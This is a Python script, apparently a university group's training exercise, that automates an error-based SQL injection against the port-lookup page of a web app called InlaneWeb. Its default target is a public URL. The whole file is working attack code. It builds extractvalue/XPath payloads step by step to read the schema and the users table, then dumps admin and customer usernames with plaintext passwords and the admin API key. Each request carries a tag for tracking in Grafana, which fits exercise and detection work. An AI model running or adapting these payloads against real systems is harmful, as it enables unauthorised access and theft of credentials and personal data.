#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Diễn tập SQL Injection dạng error based tại ô tra cứu cảng biển.

Nguyễn Đình Hải, B26CHAT010, nhóm 11, lớp M26CQAT01-B.
Kịch bản V2 trong bộ diễn tập của nhóm.

Mỗi yêu cầu đều mang mã định danh MEM_HAIND nên lọc một chuỗi trên Grafana
là tách được trọn dấu vết của lần chạy này.

    python demo/demo_sqli_haind.py
    python demo/demo_sqli_haind.py --base-url http://127.0.0.1:18090
    python demo/demo_sqli_haind.py --cham 2.5
"""
import argparse
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

THE = "MEM_HAIND"
TEN = "Nguyễn Đình Hải"
MSV = "B26CHAT010"
MAC_DINH = "https://inlaneweb.ecotools.online"

D = "\033[2m"; R = "\033[0m"; B = "\033[1m"
DO = "\033[91m"; XANH = "\033[92m"; VANG = "\033[93m"; LAM = "\033[96m"

COT = "SELECT group_concat(column_name) FROM information_schema.columns " \
      "WHERE table_name='users' AND table_schema=database()"
BANG = "SELECT group_concat(table_name) FROM information_schema.tables " \
       "WHERE table_schema=database()"

BUOC = [
    ("Tên cơ sở dữ liệu",
     "(SELECT database())",
     "Biết mình đang nói chuyện với lược đồ nào"),
    ("Đếm số bảng",
     "(SELECT count(*) FROM information_schema.tables WHERE table_schema=database())",
     "Biết quy mô của lược đồ"),
    ("Tên các bảng, đoạn 1",
     f"({BANG})",
     "extractvalue chỉ trả 32 ký tự nên danh sách bị cắt"),
    ("Tên các bảng, đoạn 2",
     f"substring(({BANG}),29,31)",
     "Dùng substring để đọc tiếp phần bị cắt"),
    ("Cột của bảng users, đoạn 1",
     f"({COT})",
     "Bảng tài khoản có những cột gì"),
    ("Cột của bảng users, đoạn 2",
     f"substring(({COT}),28,31)",
     "Lộ ra password, api_key và remember_token"),
    ("Tài khoản quản trị và mật khẩu",
     "(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)",
     "Mật khẩu lưu dạng rõ, không băm"),
    ("Tài khoản khách hàng và mật khẩu",
     "(SELECT concat(username,0x3a,password) FROM users LIMIT 1,1)",
     "Mọi chủ thể dữ liệu đều lộ như nhau"),
    ("Khóa API của quản trị",
     "(SELECT api_key FROM users WHERE role='admin' LIMIT 0,1)",
     "Khóa API thuộc mức Restricted theo GDPR Article 32"),
]


def dung_payload(bieu_thuc: str) -> str:
    """Ghép biểu thức cần đọc vào khuôn ép lỗi XPath."""
    return f"CN SHA' AND extractvalue(1,concat(0x7e,{bieu_thuc}))-- - {THE}"


def goi(base: str, payload: str, timeout: int = 25):
    tham_so = urllib.parse.urlencode({"q": payload, "mem": THE, "member": "haind"})
    url = f"{base.rstrip('/')}/ports?{tham_so}"
    req = urllib.request.Request(url, headers={
        "User-Agent": f"DevSecOps-Telemetry/3.0 ({THE}; [member: haind]; case=V2)",
        "X-Member": THE,
    })
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            than = r.read().decode("utf-8", "replace")
            ma = r.status
    except urllib.error.HTTPError as e:
        than, ma = e.read().decode("utf-8", "replace"), e.code
    except Exception as e:                                       # noqa: BLE001
        return None, 0, time.time() - t0, f"Không gọi được: {e}"
    m = re.search(r"XPATH syntax error:\s*&#039;([^&]*)&#039;", than) \
        or re.search(r"XPATH syntax error:\s*'([^']*)'", than)
    ket = m.group(1) if m else None
    return ket, ma, time.time() - t0, url


def main() -> int:
    p = argparse.ArgumentParser(description="Diễn tập SQL Injection error based, kịch bản V2")
    p.add_argument("--base-url", default=MAC_DINH, help=f"Địa chỉ InlaneWeb, mặc định {MAC_DINH}")
    p.add_argument("--cham", type=float, default=1.6, help="Giãn cách giữa hai bước, tính bằng giây")
    p.add_argument("--buoc", type=int, help="Chỉ chạy một bước, đánh số từ 1")
    a = p.parse_args()

    ds = BUOC if not a.buoc else [BUOC[a.buoc - 1]]

    print()
    print("=" * 84)
    print(f"{B} DIỄN TẬP SQL INJECTION DẠNG ERROR BASED  ·  {TEN}  ({MSV}){R}")
    print("=" * 84)
    print(f" Lỗ hổng      : Ép lỗi đọc dữ liệu tại ô tra cứu cảng biển, kịch bản V2")
    print(f" Vị trí       : web/src/pages/ports.php, CWE-89 và CWE-209")
    print(f" Mục tiêu     : {a.base_url}")
    print(f" Mã định danh : {THE}   (lọc trên Grafana bằng đúng chuỗi này)")
    print(f" Quyền cần có : {DO}không cần đăng nhập, đây là bề mặt công khai{R}")
    print("-" * 84)

    thu = []
    for i, (ten, bieu_thuc, ghi_chu) in enumerate(ds, 1):
        so = a.buoc or i
        print(f"\n {B}[{so}/{len(BUOC)}] {ten}{R}")
        print(f"   {D}{ghi_chu}{R}")
        payload = dung_payload(bieu_thuc)
        print(f"   {LAM}{payload[:76]}{'...' if len(payload) > 76 else ''}{R}")
        ket, ma, dt, _ = goi(a.base_url, payload)
        if ket is None:
            print(f"   {VANG}=> HTTP {ma}, không thấy thông báo lỗi XPath{R}")
            thu.append((ten, "không lấy được"))
            continue
        lo = ket[1:] if ket.startswith("~") else ket
        cat = " (bị cắt ở 32 ký tự)" if lo.endswith("...") else ""
        print(f"   => HTTP {ma} · {dt:.2f}s · {XANH}{B}{lo}{R}{D}{cat}{R}")
        thu.append((ten, lo))
        if a.cham and i < len(ds):
            time.sleep(a.cham)

    print("\n" + "=" * 84)
    print(f"{B} TỔNG KẾT DỮ LIỆU LẤY ĐƯỢC{R}")
    print("=" * 84)
    for ten, gt in thu:
        print(f" {ten:<34} {XANH}{gt}{R}")
    print("-" * 84)
    print(f" Tất cả chỉ bằng ô tra cứu công khai, không đăng nhập, không công cụ ngoài trình duyệt.")
    print(f"\n{B} XEM TRÊN GRAFANA{R}")
    print(f"   {{container=\"ilfreight_web\"}} |= \"{THE}\"")
    print(f"   Phân vùng sáng lên: SQL Injection trong lưu lượng HTTP, Rò rỉ lỗi và mã phản hồi 5xx")
    print("=" * 84 + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
